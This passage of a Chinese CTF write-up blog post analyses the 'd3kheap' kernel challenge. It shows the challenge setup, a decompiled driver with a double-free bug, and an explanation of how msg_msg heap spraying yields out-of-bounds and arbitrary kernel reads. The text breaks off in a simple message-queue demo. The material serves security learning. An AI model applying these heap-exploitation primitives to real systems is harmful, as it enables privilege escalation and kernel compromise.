<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 5.4.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta name="description" content="d3kheap 复现 12345678910111213141516171819202122➜  rootfs cat init                #!&#x2F;bin&#x2F;shchown -R 0:0 &#x2F;mount -t tmpfs tmpfs &#x2F;tmpmount -t proc none &#x2F;procmount -t sysfs none &#x2F;sysmount -t devtmpfs devtmp">
<meta property="og:type" content="article">
<meta property="og:title" content="msg_msg-sk_buff的组合利用+pipe_buffer attack">
<meta property="og:url" content="http://example.com/2022/06/30/msg_msg-sk_buff%E7%9A%84%E7%BB%84%E5%90%88%E5%88%A9%E7%94%A8+pipe_buffer%20attack/index.html">
<meta property="og:site_name" content="Pwn进你的心">
<meta property="og:description" content="d3kheap 复现 12345678910111213141516171819202122➜  rootfs cat init                #!&#x2F;bin&#x2F;shchown -R 0:0 &#x2F;mount -t tmpfs tmpfs &#x2F;tmpmount -t proc none &#x2F;procmount -t sysfs none &#x2F;sysmount -t devtmpfs devtmp">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="http://example.com/2022/06/30/msg_msg-sk_buff%E7%9A%84%E7%BB%84%E5%90%88%E5%88%A9%E7%94%A8+pipe_buffer%20attack/1656410685806-1663329194251.png">
<meta property="og:image" content="http://example.com/2022/06/30/msg_msg-sk_buff%E7%9A%84%E7%BB%84%E5%90%88%E5%88%A9%E7%94%A8+pipe_buffer%20attack/1656567331153-1663329194251.png">
<meta property="og:image" content="http://example.com/2022/06/30/msg_msg-sk_buff%E7%9A%84%E7%BB%84%E5%90%88%E5%88%A9%E7%94%A8+pipe_buffer%20attack/1656479312235-1663329194251.png">
<meta property="og:image" content="http://example.com/2022/06/30/msg_msg-sk_buff%E7%9A%84%E7%BB%84%E5%90%88%E5%88%A9%E7%94%A8+pipe_buffer%20attack/1656499343488-1663329194251.png">
<meta property="og:image" content="http://example.com/2022/06/30/msg_msg-sk_buff%E7%9A%84%E7%BB%84%E5%90%88%E5%88%A9%E7%94%A8+pipe_buffer%20attack/1656586953394-1663329194251.png">
<meta property="og:image" content="http://example.com/2022/06/30/msg_msg-sk_buff%E7%9A%84%E7%BB%84%E5%90%88%E5%88%A9%E7%94%A8+pipe_buffer%20attack/1656410685806.png">
<meta property="article:published_time" content="2022-06-30T12:59:39.000Z">
<meta property="article:modified_time" content="2023-04-02T09:02:20.000Z">
<meta property="article:author" content="yhellow">
<meta property="article:tag" content="pipe_buffer attack">
<meta property="article:tag" content="ret2usr">
<meta property="article:tag" content="msg_msg leak">
<meta property="article:tag" content="pipe_buffer leak">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://example.com/2022/06/30/msg_msg-sk_buff%E7%9A%84%E7%BB%84%E5%90%88%E5%88%A9%E7%94%A8+pipe_buffer%20attack/1656410685806-1663329194251.png">

<link rel="canonical" href="http://example.com/2022/06/30/msg_msg-sk_buff%E7%9A%84%E7%BB%84%E5%90%88%E5%88%A9%E7%94%A8+pipe_buffer%20attack/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : false,
    isPost : true,
    lang   : 'en'
  };
</script>

  <title>msg_msg-sk_buff的组合利用+pipe_buffer attack | Pwn进你的心</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">Pwn进你的心</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content post posts-expand">
            

    
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/06/30/msg_msg-sk_buff%E7%9A%84%E7%BB%84%E5%90%88%E5%88%A9%E7%94%A8+pipe_buffer%20attack/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          msg_msg-sk_buff的组合利用+pipe_buffer attack
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2022-06-30 20:59:39" itemprop="dateCreated datePublished" datetime="2022-06-30T20:59:39+08:00">2022-06-30</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2023-04-02 17:02:20" itemprop="dateModified" datetime="2023-04-02T17:02:20+08:00">2023-04-02</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Reappearance/" itemprop="url" rel="index"><span itemprop="name">Reappearance</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Views" id="busuanzi_container_page_pv" style="display: none;">
              <span class="post-meta-item-icon">
                <i class="eye"></i>
              </span>
              <span class="post-meta-item-text">Views: </span>
              <span id="busuanzi_value_page_pv"></span>
            </span>
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>37k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>34 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
        <p><strong>d3kheap 复现</strong></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">➜  rootfs cat init                </span><br><span class="line"><span class="meta">#</span><span class="bash">!/bin/sh</span></span><br><span class="line">chown -R 0:0 /</span><br><span class="line">mount -t tmpfs tmpfs /tmp</span><br><span class="line">mount -t proc none /proc</span><br><span class="line">mount -t sysfs none /sys</span><br><span class="line">mount -t devtmpfs devtmpfs /dev</span><br><span class="line"></span><br><span class="line">echo 1 &gt; /proc/sys/kernel/dmesg_restrict # 限制dmesg</span><br><span class="line">echo 1 &gt; /proc/sys/kernel/kptr_restrict # 普通用户都无法读取内核符号地址</span><br><span class="line"></span><br><span class="line">chown 0:0 /flag</span><br><span class="line">chmod 400 /flag</span><br><span class="line">chmod 777 /tmp</span><br><span class="line"></span><br><span class="line">insmod d3kheap.ko # 加载驱动</span><br><span class="line">chmod 777 /dev/d3kheap</span><br><span class="line"></span><br><span class="line">cat /root/banner</span><br><span class="line">echo -e &quot;\nBoot took $(cut -d&#x27; &#x27; -f1 /proc/uptime) seconds\n&quot;</span><br><span class="line">setsid cttyhack setuidgid 1000 sh</span><br><span class="line">poweroff -d 0 -f</span><br></pre></td></tr></table></figure>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">➜  d3kheap cat run.sh </span><br><span class="line"><span class="meta">#</span><span class="bash">!/bin/sh</span></span><br><span class="line">qemu-system-x86_64 \</span><br><span class="line">	-m 256M \</span><br><span class="line">	-cpu kvm64,+smep,+smap \</span><br><span class="line">	-smp cores=2,threads=2 \</span><br><span class="line">	-kernel bzImage \</span><br><span class="line">	-initrd ./rootfs.cpio \</span><br><span class="line">	-nographic \</span><br><span class="line">	-monitor /dev/null \</span><br><span class="line">	-snapshot \</span><br><span class="line">	-append &quot;console=ttyS0 kaslr pti=on quiet oops=panic panic=1&quot; \</span><br><span class="line">	-no-reboot</span><br></pre></td></tr></table></figure>
<ul>
<li>开了 kaslr</li>
<li>用了2个核心，2个线程（限制线程数量，可能有条件竞争）</li>
</ul>
<p><strong>命令定义：</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">d3kheap_ioctl</span><span class="params">(__int64 fd, __int64 command)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 caches; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  _fentry__(fd, command);</span><br><span class="line">  raw_spin_lock(&amp;spin);                         <span class="comment">// 自旋锁</span></span><br><span class="line">  <span class="keyword">if</span> ( (_DWORD)command != <span class="number">0xDEAD</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)command &gt; <span class="number">0xDEAD</span> )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_13;</span><br><span class="line">    <span class="keyword">if</span> ( (_DWORD)command == <span class="number">0x1234</span> )            <span class="comment">// 0x1234</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( buf )</span><br><span class="line">      &#123;</span><br><span class="line">        printk(&amp;unk_480);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        caches = kmem_cache_alloc_trace(kmalloc_caches[<span class="number">10</span>], <span class="number">0xCC0</span>LL, <span class="number">0x400</span>LL);</span><br><span class="line">        ++ref_count;</span><br><span class="line">        buf = caches;</span><br><span class="line">        printk(&amp;unk_37A);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_5;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)command &gt; <span class="number">0x1233</span> &amp;&amp; ((_DWORD)command == <span class="number">0x4321</span> || (_DWORD)command == <span class="number">0xBEEF</span>) )</span><br><span class="line">      printk(&amp;unk_3F0);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">LABEL_13:</span><br><span class="line">      printk(&amp;unk_4F8);</span><br><span class="line">LABEL_5:</span><br><span class="line">    pv_ops[<span class="number">79</span>](&amp;spin);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !buf )                                   <span class="comment">// 0xDEAD</span></span><br><span class="line">  &#123;</span><br><span class="line">    printk(&amp;unk_4A8);</span><br><span class="line">    <span class="keyword">goto</span> LABEL_5;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( ref_count )</span><br><span class="line">  &#123;</span><br><span class="line">    --ref_count;</span><br><span class="line">    kfree();                                    <span class="comment">// UAF</span></span><br><span class="line">    printk(&amp;unk_394);</span><br><span class="line">    <span class="keyword">goto</span> LABEL_5;</span><br><span class="line">  &#125;</span><br><span class="line">  d3kheap_ioctl_cold();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>定义了两个命令 <code>add</code>（0x1234） 和 <code>free</code>（0xDEAD）</li>
<li><code>add</code> 只能申请 0x400 大小的空间（从逻辑上来讲只能执行一次）</li>
<li><code>free</code> 会根据 <code>ref_count</code> 判断是否执行 kfree()，但是 <code>ref_count</code> 被初始化为“1”</li>
<li>并且有一个自旋锁</li>
</ul>
<p><strong>漏洞分析：</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( ref_count )</span><br><span class="line">&#123;</span><br><span class="line">  --ref_count;</span><br><span class="line">  kfree();                                    <span class="comment">// UAF</span></span><br><span class="line">  printk(&amp;unk_394);</span><br><span class="line">  <span class="keyword">goto</span> LABEL_5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.data:<span class="number">0000000000000</span>C00 <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>                   ref_count dd <span class="number">1</span> </span><br></pre></td></tr></table></figure>
<ul>
<li>本程序有 UAF，并且 ref_count 被设置为“1”</li>
<li>第一次执行 <code>add</code> 时，ref_count 会变为“2”，也就是说可以 <code>free</code> 两次</li>
</ul>
<p><strong>入侵思路：</strong></p>
<p>我的第一反应是 glibc pwn 中的 Double free，slub 中的检查和 fastbin 中的相同（会检查 freelist 指向的第一个 object），绕不过去</p>
<p>kernel pwn 中的很多利用都要依靠 <strong>结构体</strong>，比如：<code>tty_struct-&gt;tty_operations</code> 中的虚表，<code>subprocess_info</code> 的 <code>cleanup</code> 指针，但在此之前，必须先绕过 kaslr（泄露内核基地址）</p>
<p>大佬使用了 CVE-2021-22555 的堆喷 <code>msg_msg</code> 与 <code>sk_buff</code> 的解法，在学习这个方法之前需要一些前置知识：</p>
<hr>
<p><strong>msg_msg</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">m_list</span>;</span></span><br><span class="line">    <span class="keyword">long</span> m_type;</span><br><span class="line">    <span class="keyword">size_t</span> m_ts;        <span class="comment">/* message text size */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> *<span class="title">next</span>;</span></span><br><span class="line">    <span class="keyword">void</span> *security;		<span class="comment">/* the actual message follows immediately */</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_queue</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kern_ipc_perm</span> <span class="title">q_perm</span>;</span></span><br><span class="line">	<span class="keyword">time64_t</span> q_stime;		<span class="comment">/* last msgsnd time */</span></span><br><span class="line">	<span class="keyword">time64_t</span> q_rtime;		<span class="comment">/* last msgrcv time */</span></span><br><span class="line">	<span class="keyword">time64_t</span> q_ctime;		<span class="comment">/* last change time */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> q_cbytes;		<span class="comment">/* current number of bytes on queue */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> q_qnum;		<span class="comment">/* number of messages in queue */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> q_qbytes;		<span class="comment">/* max number of bytes on queue */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">pid</span> *<span class="title">q_lspid</span>;</span>		<span class="comment">/* pid of last msgsnd */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">pid</span> *<span class="title">q_lrpid</span>;</span>		<span class="comment">/* last receive pid */</span></span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">q_messages</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">q_receivers</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">q_senders</span>;</span></span><br><span class="line">&#125; __randomize_layout;</span><br></pre></td></tr></table></figure>
<p>当我们在一个消息队列上发送多个消息时，会形成如下结构：（msg 双向链表）</p>
<p><img src="/2022/06/30/msg_msg-sk_buff%E7%9A%84%E7%BB%84%E5%90%88%E5%88%A9%E7%94%A8+pipe_buffer%20attack/1656410685806-1663329194251.png" alt="1656410685806"> </p>
<ul>
<li>消息队列，Unix 的通信机制之一，可以理解为是一个存放消息（数据）容器</li>
<li>将消息写入消息队列，然后再从消息队列中取消息，一般来说是先进先出 FIFO 的顺序 </li>
</ul>
<p>虽然 <code>msg_queue</code> 的大小基本上是固定的，但是 <code>msg_msg</code> 作为承载消息的本体 <strong>其大小是可以随着消息大小的改变而进行变动的</strong>：</p>
<ul>
<li>去除掉 <code>msg_msg</code> 结构体本身的 0x30 字节的部分（或许可以称之为 header）剩余的部分都用来存放用户数据</li>
<li>因此内核分配的 object 的大小是跟随着我们发送的 message 的大小进行变动的 </li>
</ul>
<p>而当我们单次发送大于 [一个页面大小 - header size] 大小的消息时，内核会额外补充添加 <code>msg_msgseg</code> 结构体（只有一个 next 指针），其与 <code>msg_msg</code> 之间形成如下单向链表结构： </p>
<p><img src="/2022/06/30/msg_msg-sk_buff%E7%9A%84%E7%BB%84%E5%90%88%E5%88%A9%E7%94%A8+pipe_buffer%20attack/1656567331153-1663329194251.png" alt="1656567331153">  </p>
<ul>
<li>同样地，单个 <code>msg_msgseg</code> 的大小最大为一个页面大小，因此超出这个范围的消息内核会额外补充上更多的 <code>msg_msgseg</code> 结构体 </li>
<li>在读取 <code>msg_msg</code> 中的数据时，如果 <code>msg_msg-&gt;next</code> 不为空，程序就会把 <code>msg_msg-&gt;next</code> 指向的内容也当做是 <code>msg_msg data</code> 的一部分，如果 <code>msg_msgseg-&gt;next</code> 还不为空，就会继续读取 <code>msg_msgseg-&gt;next</code> 指向的内容</li>
</ul>
<p>利用：</p>
<ul>
<li>在拷贝数据时对长度的判断主要依靠的是 <code>msg_msg-&gt;m_ts</code>，若是我们能够控制一个 msg_msg 的 header，将其 <code>msg_msg-&gt;m_ts</code> 成员改为一个较大的数，我们就能够越界读取出最多将近一张内存页大小的数据</li>
<li>若是我们能够同时劫持 <code>msg_msg-&gt;m_ts</code> 与 <code>msg_msg-&gt;next</code>，我们便能够完成内核空间中的任意地址读（<code>msg_msg-&gt;next</code> 指向的数据也会被当做 <code>msg_msg data</code>）<ul>
<li>但这个方法有一个缺陷，无论是 <code>MSG_COPY</code> 还是常规的接收消息，其拷贝消息的过程的判断主要依据还是单向链表的 next 指针，因此若我们需要完成对特定地址向后的一块区域的读取，我们需要保证该地址的数据为 NULL</li>
</ul>
</li>
</ul>
<p>相关接口：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 创建和获取ipc内核对象</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">msgget</span><span class="params">(<span class="keyword">key_t</span> key, <span class="keyword">int</span> flags)</span></span>;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 将消息发送到消息队列</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">msgsnd</span><span class="params">(<span class="keyword">int</span> msqid, <span class="keyword">const</span> <span class="keyword">void</span> *msgp, <span class="keyword">size_t</span> msgsz, <span class="keyword">int</span> msgflg)</span></span>;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 从消息队列获取消息</span></span><br><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">msgrcv</span><span class="params">(<span class="keyword">int</span> msqid, <span class="keyword">void</span> *msgp, <span class="keyword">size_t</span> msgsz, <span class="keyword">long</span> msgtyp, <span class="keyword">int</span> msgflg)</span></span>;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 查看、设置、删除ipc内核对象(用法和shmctl一样)</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">msgctl</span><span class="params">(<span class="keyword">int</span> msqid, <span class="keyword">int</span> cmd, struct msqid_ds *buf)</span></span>;</span><br></pre></td></tr></table></figure>
<ul>
<li>msqid：消息队列的标识符，代表要从哪个消息列中获取消息</li>
<li>msgp： 存放消息结构体的地址（需要自己定义：<code>long type+char data[n]</code>）</li>
<li>msgsz：消息正文的字节数</li>
<li>msgtyp：消息的类型，可以有以下几种类型：<ul>
<li>msgtyp = 0：返回队列中的第一个消息</li>
<li>msgtyp &gt; 0：返回队列中消息类型为 msgtyp 的消息（常用）</li>
<li>msgtyp &lt; 0：返回队列中消息类型值小于或等于 msgtyp 绝对值的消息，如果这种消息有若干个，则取类型值最小的消息</li>
</ul>
</li>
<li>msgflg：函数的控制属性，其取值如下：<ul>
<li>0：msgrcv() 调用阻塞直到接收消息成功为止</li>
<li>MSG_NOERROR：若返回的消息字节数比 nbytes 字节数多,则消息就会截短到 nbytes 字节，且不通知消息发送进程</li>
<li>MSG_COPY：读取但不释放，当我们在调用 msgrcv 接收消息时，相应的 msg_msg 链表便会被释放，当我们在调用 msgrcv 时若设置了 <code>MSG_COPY</code> 标志位，则内核会将 message 拷贝一份后再拷贝到用户空间，原双向链表中的 message 并不会被 unlink</li>
<li>IPC_NOWAIT：调用进程会立即返回，若没有收到消息则立即返回 -1</li>
</ul>
</li>
</ul>
<p>案例：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">long</span> type;      </span><br><span class="line">    <span class="keyword">char</span> data[<span class="number">128</span>]; </span><br><span class="line">&#125;MSG_T;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">key_t</span> key;</span><br><span class="line">    <span class="keyword">int</span> msgid;</span><br><span class="line">    <span class="keyword">pid_t</span> pid;</span><br><span class="line">    MSG_T s_msg, r_msg;</span><br><span class="line"></span><br><span class="line">    key=ftok(<span class="string">&quot;.&quot;</span>,<span class="number">66</span>); <span class="comment">// key_t ftok(const char *pathname, int proj_id) 获取键值key</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;ftok success key:0x%x\n&quot;</span>, key);</span><br><span class="line"></span><br><span class="line">    msgid = msgget(key,<span class="number">0666</span> | IPC_CREAT); <span class="comment">// 创建和获取ipc内核对象</span></span><br><span class="line">    <span class="built_in">printf</span>(<span 